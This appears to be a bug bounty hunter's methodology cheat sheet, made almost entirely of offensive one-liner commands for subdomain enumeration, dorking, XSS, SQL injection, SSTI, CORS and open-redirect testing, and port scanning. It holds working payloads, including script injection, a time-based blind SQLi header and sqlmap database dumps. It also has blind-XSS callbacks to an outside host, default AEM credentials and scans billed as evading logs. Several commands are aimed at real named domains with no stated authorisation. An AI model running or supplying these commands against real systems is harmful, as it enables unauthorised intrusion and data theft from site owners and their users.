
##########################  My Bug Hunting Methodology | wadgamer10  ###########################

Twitter :-  https://twitter.com/wadgamer10
LinkedIn :-https://www.linkedin.com/in/wadgamer10


## Recon :-

- subfinder

subfinder -dL domains.txt -o subfinder.txt

subfinder -d inholland.nl -o subfinder.txt


- amass

go install -v github.com/OWASP/Amass/v3/...@master

amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt


- crtfinder

python3 crtfinder.py -u alloyhome.com


- sublist3r

sublist3r -d safesavings.com -o sublist3r.txt


- site:*.ibm.com -site:www.ibm.com



- # Merging subdomains into one file :- all-subs.txt

cat amass.txt subfinder.txt gobuster_subs.txt other.txt | anew all-subs.txt


- cat all-subs.txt | httpx -o live-subs.txt


- cat live-subs.txt | dirsearch --stdin 


- also ffuf :-

ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c true -v -o output.txt

----------------------------------------------------------------------------------------------


## Subdomain Takeover :-

1- Recon (live-subs.txt)

2- Testing :-


1- Nuclei :-


- nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt


2- Subzy :-  https://github.com/LukaSikic/subzy


- subzy run --targets live-subs.txt

- subzy run --target test.google.com

- subzy run --target test.google.com,https://test.yahoo.com





__________________________________________________________________________________________________

## virtual Host scanner :-

- git clone https://github.com/jobertabma/virtual-host-discovery.git

- ruby scan.rb --ip=151.101.194.133 --host=cisco.com

__________________________________________________________________________________________________


## JS Hunting :-


1- ﻿echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt


2- echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'


3- JSS-Scanner :-

- echo "invisionapp.com" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > j.txt

- python3 JSScanner.py


__________________________________________________________________________________________________


## Shodan Dorking :-


- ssl.cert.subject.CN:"gevme.com*" 200

- ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"

- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"

- Set-Cookie:"mongo-express=" "200 OK"

- ssl:"invisionapp.com" http.title:"index of / "

- ssl:"arubanetworks.com" 200 http.title:"dashboard"

- net:192.168.43/24, 192.168.40/24

- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git

User:anonymous
Pass:anonymous


## Collect all interisting ips from Shodan and save them in ips.txt

- cat ips.txt | httpx > live-ips.txt

- cat live_ips.txt | dirsearch --stdin

__________________________________________________________________________________________________


## Google dorking :-

- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp

- intext:"index of /.git"

- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"


- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com

- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)

- inurl:/geoserver/ows?service=wfs


__________________________________________________________________________________________________


## Github Dorking on live-subs.txt :-

- git-Grabber :-

- python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s

- python3 gitGraber.py -k wordlists/keywords.txt -q \"yahoo.com\" -s

- python3 gitGraber.py -k keywordsfile.txt -q \"yahoo.com\" -s -w mywordlist.txt


- GitHound


__________________________________________________________________________________________________

## Check-list :- Manual Hunting inside websites for :-

1- CSRF
2- IDORS
3- Bussiness Logic Vulnerbilities
4- API bugs 
5- SQLi
6- XSS

__________________________________________________________________________________________________


## XSS :-

- Paramspider :- 

- python3 paramspider.py --domain indrive.com

- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt

- cat indrive.txt | kxss  ( looking for reflected :-  "<> )


## Looking for Hidden parameters :-

- Arjun :- 

- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt


- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done


- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht

- dalfox file urls.txt -b https://hahwul.xss.ht


- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100

- cat urls.txt | Gxss -c 100 -p XssReflected

__________________________________________________________________________________________________


## Sql Injection :-


- echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt

- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt

- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt


- sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2


## SQLi One Linear :-

- cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt


## Dump-Data :-

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users

__________________________________________________________________________________________________

## SSTI :-


FOR Testing SSTI and tplmap tool :-

- git clone https://github.com/epinna/tplmap.git

- ./tplmap.py -u "domain.com/?parameter=SSTI*"

__________________________________________________________________________________________________

- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php

- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json

__________________________________________________________________________________________________



######## Testing for xss and sqli at the same time >_< ##############


- cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt

- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

- cat param.txt | kxss   

__________________________________________________________________________________________________


## Blind SQL Injection :-

Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z


## Blind XSS :-

site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"

## Go to xss.report website and create an account to test for blind xss Vulnerbilitites 
__________________________________________________________________________________________________


## Hunting For Cors Misconfigration :-


https://github.com/chenjj/CORScanner

pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

________________________________________________________________________________________________

https://github.com/Tanmay-N/CORS-Scanner

go install github.com/Tanmay-N/CORS-Scanner@latest

cat CORS-domain.txt | CORS-Scanner

________________________________________________________________________________________________

## Nmap Scanning :-

#- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.

#- nmap -sS -p- -iL hosts.txt 

#- nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt


#- nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

#- nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).

#- nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).

#- nmap -sV 192.168.1.4 (Services Fingerprinting).

#- nmap 192.168.1.5 -O   (OS Fingerprinting).

#- nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.

#- nmap -iL hosts.txt -sn


#- nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).

#- nc -vn 34.66.209.2 22        (Services Fingerprinting).


#- netdiscover     (Devices On Network) (Layer2).

#- netdiscover -r 192.168.2.0/24  (Range).

#- netdiscover -p        (Passive).

#- netdiscover -l hosts.txt
__________________________________________________________________________________________________


## Running Nuclei :-

Scanning target domain with community-curated nuclei templates :-

- nuclei -u https://example.com

- nuclei -list urls.txt -t /fuzzing-templates

- nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml

- nuclei -u https://example.com -w workflows/
__________________________________________________________________________________________________


## Open Redirect:- 

Open Redirection OneLiner :-

- waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done

- httpx -l i.txt -path "///evil.com" -status-code -mc 302

_________________________________________________________________________________


## Resources And Tools :-

https://github.com/orwagodfather/x

https://github.com/SAPT01/HBSQLI

python3 hbsqli.py -l y.txt -p payloads.txt -H headers.txt -v

python3 hbsqli.py -u "https://target.com" -p payloads.txt -H headers.txt -v

https://github.com/thecybertix/One-Liner-Collections

https://github.com/projectdiscovery/fuzzing-templates

https://github.com/0xKayala/NucleiFuzzer

https://wpscan.com/vulnerability/825eccf9-f351-4a5b-b238-9969141b94fa

_________________________________________________________________________________


####### 📌 Complete Bug Bounty tool List 📌

dnscan https://github.com/rbsec/dnscan

Knockpy https://github.com/guelfoweb/knock

Sublist3r https://github.com/aboul3la/Sublist3r

massdns https://github.com/blechschmidt/massdns

nmap https://nmap.org

masscan https://github.com/robertdavidgraham/masscan

EyeWitness https://github.com/ChrisTruncer/EyeWitness

DirBuster https://sourceforge.net/projects/dirbuster/

dirsearch https://github.com/maurosoria/dirsearch

Gitrob https://github.com/michenriksen/gitrob 

git-secrets https://github.com/awslabs/git-secrets

sandcastle https://github.com/yasinS/sandcastle

bucket_finder https://digi.ninja/projects/bucket_finder.php

GoogD0rker https://github.com/ZephrFish/GoogD0rker/

Wayback Machine https://web.archive.org

waybackurls https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050 Sn1per https://github.com/1N3/Sn1per/

XRay https://github.com/evilsocket/xray

wfuzz https://github.com/xmendez/wfuzz/

patator https://github.com/lanjelot/patator

datasploit https://github.com/DataSploit/datasploit

hydra https://github.com/vanhauser-thc/thc-hydra

changeme https://github.com/ztgrace/changeme

MobSF https://github.com/MobSF/Mobile-Security-Framework-MobSF/ Apktool https://github.com/iBotPeaches/Apktool

dex2jar https://sourceforge.net/projects/dex2jar/

sqlmap http://sqlmap.org/

oxml_xxe https://github.com/BuffaloWill/oxml_xxe/ @cyb3rhunt3r

XXE Injector https://github.com/enjoiz/XXEinjector

The JSON Web Token Toolkit https://github.com/ticarpi/jwt_tool

ground-control https://github.com/jobertabma/ground-control

ssrfDetector https://github.com/JacobReynolds/ssrfDetector

LFISuit https://github.com/D35m0nd142/LFISuite

GitTools https://github.com/internetwache/GitTools

dvcs-ripper https://github.com/kost/dvcs-ripper

tko-subs https://github.com/anshumanbh/tko-subs

HostileSubBruteforcer https://github.com/nahamsec/HostileSubBruteforcer Race the Web https://github.com/insp3ctre/race-the-web

ysoserial https://github.com/GoSecure/ysoserial

PHPGGC https://github.com/ambionics/phpggc

CORStest https://github.com/RUB-NDS/CORStest

retire-js https://github.com/RetireJS/retire.js

getsploit https://github.com/vulnersCom/getsploit

Findsploit https://github.com/1N3/Findsploit

bfac https://github.com/mazen160/bfac

WPScan https://wpscan.org/

CMSMap https://github.com/Dionach/CMSmap

Amass https://github.com/OWASP/Amass




#################### wadgamer10 #######################


